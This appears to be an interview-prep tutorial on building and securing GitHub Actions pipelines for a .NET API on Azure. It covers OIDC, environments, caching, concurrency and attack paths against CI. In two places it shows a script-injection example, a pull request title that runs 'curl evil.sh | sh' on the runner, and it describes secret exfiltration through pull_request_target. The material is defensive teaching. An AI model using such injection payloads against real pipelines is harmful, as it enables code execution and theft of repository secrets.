GitHub Actions In Depth

A good pipeline builds once, tests fast, authenticates without secrets, and makes the approval mean something specific.

🟡 Intermediate 🔴 Advanced 🔥 Must know
Quick revision
  • Build once, deploy the same artefact to every environment.
  • OIDC to Azure — no service principal secret to store or rotate.
  • Environments give approvals and scoped secrets.
  • Cache NuGet keyed on the lock file, not on the commit.
  • Set permissions explicitly — the default token is broad.
  • Pin third-party actions to a SHA, not a tag.
  • pull_request_target is dangerous — it runs with secrets.
  • concurrency to stop deployments racing each other.

Structure 🟢 Beginner

LevelIsNote
WorkflowA YAML file in .github/workflowsTriggered by events
JobA set of steps on one runnerJobs run in parallel unless you declare needs
StepA command or an actionSteps in a job share the filesystem
ActionA reusable unitJavaScript, Docker, or composite
RunnerThe machineA fresh VM per job — nothing persists between jobs
Each job is a clean machine, and that shapes everything

Jobs don't share a filesystem. A separate job doesn't have your build output, your restored packages, or your checked-out code unless you fetch them again.

So passing work between jobs means artifacts (upload in one, download in another) or outputs for small values. That's the mechanism, and forgetting it is the most common first-workflow mistake — a build job followed by a deploy job that finds nothing to deploy.

The upside is isolation: a job can't be affected by leftover state from another, and jobs run in parallel by default, so independent work is concurrent for free. You only serialise where you declare needs.

Which gives the shape of a good pipeline: fan out for independent checks — build, lint, unit tests, security scan — then a single job that gates on all of them.

A .NET pipeline 🔥 Must know

name: build-and-deploy

on:
  push:
    branches: [main]
  pull_request:

# Default to read-only. Grant more per job, not globally.
permissions:
  contents: read

# Cancel superseded PR runs; never cancel a deploy mid-flight
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

env:
  DOTNET_VERSION: '9.0.x'
  DOTNET_SKIP_FIRST_TIME_EXPERIENCE: true
  DOTNET_NOLOGO: true

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: ${{ env.DOTNET_VERSION }}
          cache: true                          # caches NuGet, keyed on lock files
          cache-dependency-path: '**/packages.lock.json'

      - run: dotnet restore --locked-mode      # fail if the lock file is stale

      - run: dotnet build --no-restore -c Release

      - run: dotnet test --no-build -c Release
             --logger trx --collect:"XPlat Code Coverage"
             --results-directory ./TestResults

      - name: Publish test results
        uses: dorny/test-reporter@v1
        if: always()                           # report even when tests failed
        with:
          name: tests
          path: TestResults/*.trx
          reporter: dotnet-trx

      # Publish ONCE. Every environment deploys this exact output.
      - run: dotnet publish src/Orders.Api -c Release -o ./publish --no-build

      - uses: actions/upload-artifact@v4
        with:
          name: app
          path: ./publish
          retention-days: 30

  deploy-test:
    needs: build
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment:
      name: test
      url: https://orders-test.azurewebsites.net
    permissions:
      id-token: write                          # OIDC
      contents: read
    steps:
      - uses: actions/download-artifact@v4
        with: { name: app, path: ./publish }

      - uses: azure/login@v2
        with:                                  # no client secret
          client-id: ${{ vars.AZURE_CLIENT_ID }}
          tenant-id: ${{ vars.AZURE_TENANT_ID }}
          subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}

      - uses: azure/webapps-deploy@v3
        with:
          app-name: app-orders-test
          package: ./publish

  deploy-prod:
    needs: deploy-test
    runs-on: ubuntu-latest
    environment:
      name: production                         # required reviewers configured here
      url: https://orders.example.com
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/download-artifact@v4
        with: { name: app, path: ./publish }

      - uses: azure/login@v2
        with:
          client-id: ${{ vars.AZURE_CLIENT_ID }}
          tenant-id: ${{ vars.AZURE_TENANT_ID }}
          subscription-id: ${{ vars.AZURE_SUBSCRIPTION_ID }}

      # Deploy to a slot, verify, then swap - zero downtime, instant rollback
      - uses: azure/webapps-deploy@v3
        with:
          app-name: app-orders-prod
          slot-name: staging
          package: ./publish

      - name: Smoke test the slot before it takes traffic
        run: |
          for i in {1..10}; do
            code=$(curl -sf -o /dev/null -w "%{http_code}" \
              https://app-orders-prod-staging.azurewebsites.net/health/ready) && break
            sleep 5
          done
          test "$code" = "200"

      - run: az webapp deployment slot swap -g rg-orders-prod
             -n app-orders-prod --slot staging --target-slot production
Senior signal — build once is the property that makes the pipeline trustworthy

The most common structural mistake is rebuilding per environment: a build-and-deploy job for test, another for production, each running dotnet publish again.

That breaks the guarantee the pipeline exists to provide. The thing you tested is not the thing you shipped — it's a different build from the same source, and a transitive dependency that moved, a different SDK patch on the runner, or a changed build variable makes them genuinely different bytes.

Build once, upload the artefact, and have every deploy job download that. Then "it passed in test" is a statement about the artefact in production, not about a sibling of it.

It's also faster — one build instead of three — and it's the same reasoning as deploying an image digest rather than rebuilding from a commit, and as applying a saved Terraform plan rather than a fresh one. The reviewed and tested artefact must be the executed artefact.

One caveat worth knowing: dotnet publish output can be runtime-specific, so a self-contained or AOT publish needs one artefact per target runtime. That's a reason to have several artefacts, not a reason to rebuild per environment.

Senior signal — federate on the environment, not just the repository

The obvious win is that no credential is stored. The stronger property is what the trust is bound to.

A federated credential in Entra names a subject, and GitHub's signed token must match it. So a credential for repo:org/app:environment:production is only honoured for a job that actually declares environment: production — and that environment is where your required reviewers live.

Which means the approval gate and the credential are the same control. A job without the environment cannot obtain the token at all.

Federating on the repository or on ref:refs/heads/main only is much weaker: any workflow in the repository can request production credentials, so someone adding a workflow file bypasses the approval entirely.

The same reasoning as managed identity for applications and OIDC for Terraform: the best credential is one that doesn't exist, and the next best is one that only works in exactly one place.

Grant id-token: write per job, not at workflow level, so only the jobs that deploy can mint a token.

Permissions and untrusted input 🔥 Must know

permissions:
  contents: read            # workflow default: read-only

jobs:
  comment:
    permissions:
      contents: read
      pull-requests: write  # ONLY this job can comment
    steps:
      # WRONG - PR title is attacker-controlled and is interpolated into a shell
      # - run: echo "Reviewing ${{ github.event.pull_request.title }}"
      #   A title of  "; curl evil.sh | sh; #  executes on the runner.

      # RIGHT - pass through the environment; the shell never parses it
      - run: echo "Reviewing $PR_TITLE"
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
Two supply-chain traps worth knowing by name

Script injection. ${{ }} is substituted into the script as text before the shell runs. So any attacker-controlled field — a pull request title, a branch name, an issue body, a commit message — becomes shell code. Assign it to an environment variable and reference $VAR instead, and the shell treats it as data.

pull_request_target. Unlike pull_request, this trigger runs with the base repository's secrets and a writable token. If such a workflow checks out the pull request's head and executes anything from it — a build script, a test, an npm postinstall — then anyone who can open a pull request from a fork can run code with your secrets.

That's not theoretical; it's been used to exfiltrate credentials from real repositories. Use pull_request unless you have a specific reason, and if you must use pull_request_target, never check out untrusted code in it.

Alongside those: pin third-party actions to a full commit SHA, not a tag. @v3 is a movable pointer the action's owner controls, so a compromised or repointed tag runs new code in your pipeline with your permissions. A SHA is immutable. Dependabot can update pinned SHAs, so you keep both safety and currency.

And set permissions explicitly. The default GITHUB_TOKEN is broader than most jobs need — declare contents: read at workflow level and add specific grants per job.

# .github/workflows/dotnet-ci.yml  (in a central repository)
on:
  workflow_call:
    inputs:
      project:        { required: true,  type: string }
      dotnet-version: { required: false, type: string, default: '9.0.x' }
    outputs:
      artifact-name:
        value: ${{ jobs.build.outputs.artifact }}
    secrets:
      NUGET_FEED_TOKEN: { required: false }

# Caller, in each service repository:
# jobs:
#   ci:
#     uses: my-org/.github/.github/workflows/dotnet-ci.yml@a1b2c3d   # pin a SHA
#     with:
#       project: src/Orders.Api
#     secrets: inherit
Centralise the shape, and version it

Reusable workflows are how you stop twelve repositories having twelve slightly different CI pipelines that all drift. Define the standard shape — restore, build, test, scan, publish, deploy — once, and have each service call it with a few inputs.

Then improvements land everywhere: adding a security scan is one commit rather than twelve pull requests.

Two things to get right. Reference by SHA or tag, not by branch. A workflow referenced by @main changes under every consumer without warning — so a mistake in the shared workflow breaks every repository simultaneously, and there's no way to roll one back. Same reasoning as pinning a Terraform module or a NuGet package version.

And be careful with secrets: inherit. It's convenient and it passes everything the caller has to the called workflow. For a workflow in your own organisation that's usually acceptable; for anything less trusted, pass secrets explicitly so the surface is visible.

A cache key on the commit SHA is a cache that never hits

The cache key must be derived from what the cache depends on. For NuGet that's the lock files: hashFiles('**/packages.lock.json').

Keying on the commit SHA produces a unique key per run, so every run misses, writes a new entry, and you get the cost of caching with none of the benefit — plus the cache fills up and evicts things that would have hit.

Use restore-keys as a prefix fallback, so a changed lock file still restores the previous cache and downloads only what's new rather than everything.

Two more notes. Central Package Management with packages.lock.json plus dotnet restore --locked-mode is worth adopting anyway: builds become reproducible, and restore fails loudly if the lock file is stale rather than silently resolving a different version.

And caches are scoped by branch, with pull request branches able to read from the base branch but not the reverse. So a cache warmed on a feature branch doesn't help anyone else — populate it on main.

concurrency, and the deploy exception

Without a concurrency group, pushing three times to a branch runs three full pipelines, and the first two are already obsolete. A group keyed on workflow and ref with cancel-in-progress cancels the superseded ones — real savings on a busy repository.

Do not cancel in-progress deployments. Killing a deploy halfway leaves a partial rollout, a half-applied migration, or a slot in an unknown state. Recovering from that is worse than a wasted minute.

So the pattern is cancel-in-progress only for pull request runs — as in the workflow above — and a separate, non-cancelling concurrency group for deploy jobs so two deployments to the same environment queue instead of racing.

That second part matters more than it sounds. Two concurrent deploys to one App Service can swap slots in the wrong order and leave the older build live, with the pipeline reporting success.

Path filters and required checks interact badly

A paths filter that skips a workflow means the check never reports — it isn't skipped-as-success, it simply doesn't exist. If that check is required for merge, the pull request is blocked forever with no obvious reason.

The fix is a gate job that always runs and reports success when the real jobs were correctly skipped, using if: always() and inspecting needs.*.result.

It's a small piece of plumbing that's easy to get wrong in the confusing direction: a naive version reports success when a job failed, silently disabling the check you thought you had. Test it by deliberately breaking a test and confirming the gate goes red.

Senior signal — environments are a security boundary, not a label

It's easy to treat an environment as documentation. It's doing three real jobs at once.

Secret scoping. A production secret attached to the production environment is unavailable to any other job. So a workflow someone adds on a feature branch cannot read it — which is a genuine boundary, not a convention.

Deployment branch rules. Restricting the production environment to main means a job on any other ref cannot deploy there, whatever the YAML says.

The OIDC subject. As above, the federated credential binds to the environment, so the approval gate and the credential become one control.

Stacked together, these mean "deploy to production" requires being on main, passing the required checks, getting a human approval, and only then obtaining a short-lived token scoped to that environment. Each layer is a repository setting rather than a promise about behaviour.

Structural, not procedural — the same principle as branch protection, Azure Policy in deny mode, and read-only portal access. A control that depends on people doing the right thing isn't a control.

Key takeaways
  • Each job is a fresh machine — pass work via artifacts or outputs.
  • Build once and deploy that artefact everywhere.
  • OIDC instead of a stored secret, federated on the environment.
  • Grant id-token: write per job, not workflow-wide.
  • Set permissions: contents: read as the default.
  • Never interpolate untrusted input into a shell — pass it via env.
  • pull_request_target runs with secrets; don't check out untrusted code in it.
  • Pin third-party actions to a SHA and let Dependabot update them.
  • Cache keyed on lock files, with restore-keys; caches are branch-scoped.
  • cancel-in-progress for pull requests only; queue deploys, never cancel them.
  • Path filters break required checks — add an always-running gate job and test it.
  • Reusable workflows pinned by SHA; be deliberate about secrets: inherit.
  • Environments give approvals, scoped secrets, branch rules and the OIDC subject.
  • Deploy to a slot, smoke test, then swap.

Common mistakes

  • Rebuilding per environment, so production runs a different build from the tested one.
  • A service principal secret instead of OIDC.
  • OIDC federated on the repository only, so any branch can reach production.
  • No permissions block, leaving the token broader than needed.
  • Interpolating a PR title into run: — script injection.
  • pull_request_target checking out fork code.
  • Third-party actions pinned to a tag rather than a SHA.
  • Cache keyed on the commit SHA, so it never hits.
  • cancel-in-progress on deploys, leaving a partial rollout.
  • Concurrent deploys to one environment, swapping slots out of order.
  • Path filters blocking required checks with no gate job.
  • A gate job that reports success on failure.
  • Reusable workflows referenced by @main, changing under consumers.
  • No smoke test before a slot swap.
  • Secrets echoed in logs by a debug step.

Intermediate

Design the CI/CD pipeline for a .NET API deploying to Azure. 🔥 Must know
How I'd answer

"I'd organise it around one principle: build once, deploy that artefact everywhere. Most of the other decisions follow from it."

"On a pull request: restore with NuGet caching, build, run unit and integration tests, run analyzers and a security scan. Fast feedback, and nothing deploys."

"On merge to main: the same build, then dotnet publish once, uploaded as an artefact. Every subsequent deploy job downloads that artefact."

"That matters because rebuilding per environment breaks the guarantee the pipeline exists for. A rebuild from the same commit isn't the same bytes — a transitive dependency may have moved, the runner's SDK patch may differ. So 'it passed in test' would be a statement about a sibling of what's in production. Building once makes it a statement about the artefact itself. It's also faster."

"Authentication is OIDC, not a stored service principal secret. Nothing to rotate, nothing to leak — and the token is bound to the repository, branch and environment, so even exfiltrated it's useless elsewhere. That needs id-token: write, and I'd grant it per job rather than workflow-wide."

"Promotion through environments: test automatically, then production behind a GitHub environment with required reviewers. The approval is enforced by the platform, not by convention — and the environment also scopes the production secrets so no other job can read them, and restricts deployment to main."

"I'd federate the OIDC credential on the environment specifically, so the approval gate and the credential are the same control. Federating on the repository alone means anyone adding a workflow file can request production credentials, which bypasses the approval entirely."

"The production deploy itself goes to a deployment slot, then smoke tests the slot's health endpoint, then swaps. Zero downtime because the swap is a routing change, and rollback is another swap — seconds, no rebuild. Deploying straight over the running app means downtime and a rollback that costs a full redeploy."

"Database migrations run as a separate step before the app deploy, and must be backward compatible — because during the swap and any canary period, both versions are running against the same schema. That's expand-and-contract across releases, and it's the part of deployment that pipelines don't solve for you."

"A few supporting details I'd include."

"permissions: contents: read as the workflow default, with specific grants per job. The default token is broader than most jobs need."

"Concurrency — cancel-in-progress for pull request runs so superseded runs don't burn minutes, but never for deploys. Cancelling a deploy halfway leaves a partial rollout or a half-applied migration. Deploys to the same environment should queue, not race — two concurrent deploys can swap slots in the wrong order and leave the older build live while the pipeline reports success."

"Third-party actions pinned to a commit SHA, not a tag, since a tag is a movable pointer someone else controls. Dependabot keeps the pins current."

"Post-deploy verification beyond the smoke test — watching error rate and latency in Application Insights for a few minutes, with a documented rollback that's just a slot swap back."

"If there were several services, I'd move this into a reusable workflow so the shape is defined once and improvements land everywhere — referenced by SHA, not by @main, so a mistake in the shared workflow doesn't break every repository at once."

Advanced

How would you attack a GitHub Actions pipeline, and how do you defend it? ⭐ Senior-level
How I'd answer

"The thing to internalise is that CI is a privileged execution environment. It holds cloud credentials, can push to registries and can deploy to production. So it's a high-value target, and it often has weaker controls than the production environment it deploys to."

"The main attack paths, and what stops each:"

"Script injection. ${{ }} is substituted into the script as text before the shell runs. So an attacker-controlled field — a pull request title, a branch name, an issue body — becomes shell code. A title of "; curl evil.sh | sh; # executes on the runner with whatever the token can do."

"The fix is to pass untrusted values through env and reference $VAR, so the shell receives data rather than code. It's a small change and it's routinely missed."

"pull_request_target. This is the serious one. Unlike pull_request, it runs with the base repository's secrets and a writable token. If such a workflow checks out the pull request head and runs anything from it — a build script, a test, an npm postinstall — then anyone who can open a fork PR executes code with your secrets. That's been used to steal credentials from real repositories."

"So: use pull_request unless there's a specific need, and if pull_request_target is genuinely required, never check out untrusted code in it. Do the privileged work in a separate workflow triggered by workflow_run."

"A compromised third-party action. Referencing @v3 is trusting a movable pointer the action's owner controls — so a compromised account or a repointed tag runs new code in your pipeline with your permissions. This has happened, notably with tj-actions/changed-files."

"Pin to a full commit SHA, which is immutable, and let Dependabot propose updates so you keep currency without giving up immutability. I'd also allow-list which actions the organisation may use at all."

"An over-permissive token. The default GITHUB_TOKEN is broader than most jobs need, so any code execution on the runner inherits it. Declare permissions: contents: read at workflow level and grant specific rights per job."

"Long-lived cloud credentials. A stored service principal secret works from anywhere, so exfiltrating it is enough. OIDC removes it — tokens are per-run, minutes long, and bound to repo, branch and environment, so a stolen one is useless. Federate on the environment, not just the repository."

"Secrets in logs. GitHub masks known secret values, and it can't mask a derived value — a base64-encoded secret, or one embedded in a JSON blob a debug step prints. So I'd be careful about debug output, and treat any secret that has appeared in a log as compromised and rotate it."

"Cache poisoning. Caches are writable from workflows, and a pull request branch can write a cache the base branch may later read. So a poisoned dependency cache is a plausible path. Scoping matters, and it's an argument for restore keys that are specific rather than broadly shared."

"Self-hosted runners on public repositories. A fork pull request can run on your runner, and unlike GitHub-hosted runners it isn't ephemeral — so an attacker can leave things behind for the next job, including a build of your code. If self-hosted runners are needed, they should be ephemeral and never used for public repository pull requests."

"Defence in depth beyond the pipeline: branch protection so main can't be force-pushed or bypassed; required reviews including on workflow files, since a change to .github/workflows is a privilege change and deserves more scrutiny than application code; environment approvals for production; and artifact attestation so you can verify a deployed artefact came from the expected workflow and commit."

"The framing I'd offer: the pipeline usually has more privilege than any individual and less scrutiny than production. So it should be reviewed like production infrastructure, and a change to a workflow file should be treated as a change to who can do what — because that's exactly what it is."

What they're really checking
  • Do you know script injection via ${{ }}?
  • Do you know why pull_request_target is dangerous?
  • Do you pin actions to SHAs, and know why tags aren't enough?
  • Do you scope permissions and prefer OIDC?
  • Do you know self-hosted runners aren't ephemeral?
  • Do you treat workflow changes as privilege changes?
Weak answers
  • Red flag: "we store secrets in GitHub secrets, so it's fine."
  • Red flag: unaware that action tags are mutable.
  • Red flag: no distinction between pull_request and pull_request_target.
